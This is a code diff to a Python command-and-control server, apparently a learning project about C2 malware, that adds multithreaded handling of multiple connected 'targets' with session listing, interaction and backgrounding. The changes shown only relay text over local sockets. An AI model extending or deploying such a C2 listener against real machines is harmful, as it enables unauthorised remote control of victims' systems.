@@ -8,13 +8,15 @@
 #                   understanding of C2 malware and a further understanding of Python 
 #                   Socket applications.
 # Theme Song:   https://www.youtube.com/watch?v=3abZal0fXCU&ab_channel=MichaelWyckoff
-# Changelog:    Moved some exception handling into __main__
-#               Revised exception handling
-#               Added list of data on connected targets for future use
+# Changelog:    Implemented multithreading for multiple client sessions
+#               Implemented command values for user input
+#               Reorganized handler functions to support multithreaded target sessions
+#               Implemented 'background' function
 ###########################################################################################
 
 import socket
 import sys
+import threading
 
 buffer_size = 1024
 
@@ -27,63 +29,86 @@ def banner():
     print('╚═════╝  ╚═════╝ ╚═╝  ╚═══╝   ╚═╝       ╚═╝     ╚══════╝╚═╝  ╚═══╝ ╚═════╝╚══════╝    ╚═╝     ╚═╝╚══════╝    ╚═╝╚═╝  ╚═══╝')
     print('                                                                                                    by Seth Gibson        ')
 
-def comm_in(remote_target):
+def comm_in(target_id):
     print('[+] Awaiting response...')
-    response = remote_target.recv(buffer_size).decode()
+    response = target_id.recv(buffer_size).decode()
     return response
 
-def comm_out(remote_target, message):
-    remote_target.send(message.encode())
+def comm_out(target_id, message):
+    message = str(message)
+    target_id.send(message.encode())
 
 def listener_handler():
     sock.bind((host_ip, host_port))
     print('[+] Awaiting Connection from Client...')
     sock.listen()
-    remote_target, remote_ip = sock.accept()
-    targets.append([remote_target, remote_ip])
 
-    comm_handler(remote_target, remote_ip)
+    t1 = threading.Thread(target=comm_handler)
+    t1.start()
 
-def comm_handler(remote_target, remote_ip):
-    print(f'[+] Connection recieved from {remote_ip[0]}')
-
+def comm_handler():
     while True:
-        try:
-            message = input('[>] Server Message to send #> ')
-            remote_target.send(message.encode())
-
-            if message == 'exit':
-                remote_target.close()
-                break
-
-            response = remote_target.recv(buffer_size).decode()
-            print('[+] Message from client: \n' + response)
-
-            if response == 'exit':
-                print('[-] The client has terminated the session.')
-                remote_target.close()
-                break
-
-        except KeyboardInterrupt:
-            remote_target.send('exit'.encode())
-            remote_target.close()
-            print('\n[-] Interrupt issued, program exit.')
+        if kill_flag == 1:
             break
+        try:
+            remote_target, remote_ip = sock.accept()
+            targets.append([remote_target, remote_ip[0]])
+            print(f'\n[+] Connection recieved from {remote_ip[0]}\n[>] Enter command #> ')
+        except:
+            pass
 
-        #except Exception:
-        #    remote_target.close()
-        #    break
+def target_comm(target_id):
+    while True:
+        message = input('[' + targets[selection][1] + ' >] Send message #> ')
+        comm_out(target_id, message)
+
+        if message == 'exit':
+            target_id.send(message.encode())
+            target_id.close()
+            break
+        if message == 'background':
+            break
+        else:
+            response = comm_in(target_id)
+            if response == 'exit':
+                print('[' + targets[selection][1] + ' >] The client has terminated the session.')
+                target_id.close()
+                break
+            print(response)
 
 if __name__ == '__main__':
     targets = []
+    kill_flag = 0
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
     try:
-        host_ip = sys.argv[1]
-        host_port = int(sys.argv[2])
+        #host_ip = sys.argv[1]
+        #host_port = int(sys.argv[2])
+        host_ip = '127.0.0.1'
+        host_port = 2222
         banner()
-        listener_handler()
-    except IndexError:
-        print('[-] Command line arguments are missing. Please try again.')
+    #except IndexError:
+    #    print('[-] Command line arguments are missing. Please try again.')
     except Exception as e:
         print(e)
+
+    listener_handler()
+    while True:
+        try:
+            cmd = input('[>] Enter command #> ')
+            if cmd.split(" ")[0] == 'sessions':
+                session_counter = 0
+                if cmd.split(" ")[1] == '-l':
+                    print('Session' + ' ' * 10 + 'Target')
+                    for target in targets:
+                        print(str(session_counter) + ' ' * 16 + target[1])
+                        session_counter += 1
+                if cmd.split(" ")[1] == '-i':
+                    selection = int(cmd.split(" ")[2])
+                    selection_id = (targets[selection])[0]
+                    target_comm(selection_id)
+        except KeyboardInterrupt:
+            print('\n[-] Keyboard Interrupt issued. Exiting...')
+            kill_flag = 1
+            sock.close()
+            break
